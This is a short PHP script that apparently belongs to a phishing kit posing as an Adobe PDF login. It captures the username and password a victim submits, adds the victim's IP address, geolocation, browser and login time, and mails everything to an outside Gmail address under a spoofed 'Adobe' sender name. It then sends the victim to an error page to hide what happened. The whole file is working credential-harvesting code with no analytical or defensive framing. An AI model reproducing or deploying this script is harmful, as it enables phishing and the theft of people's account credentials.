<?php



require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------------+ Login Detail +--------------------\n";
$message .= "\n";
$message .= "User: ".$_POST['login']."\n";
$message .= "Pass: ".$_POST['passwd']."\n";
$message .= "\n";
$message .= "-------------------- [User Information] --------------------\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.=      "Login Date  : ".$date."\n";
$message.=      "Login Time  : ".$time."\n";
$message .= "\n";
$message .= "-------------------------------------------------------------\n";


$domain = 'Adobe';
$subj = "PDF Login: | {$geoplugin->ip} | {$geoplugin->countryName} |";
$from = "From: $domain<west>\n";
mail("mygood.logins@gmail.com",$subj,$message,$from,$domain);


header("Location: ./error.php");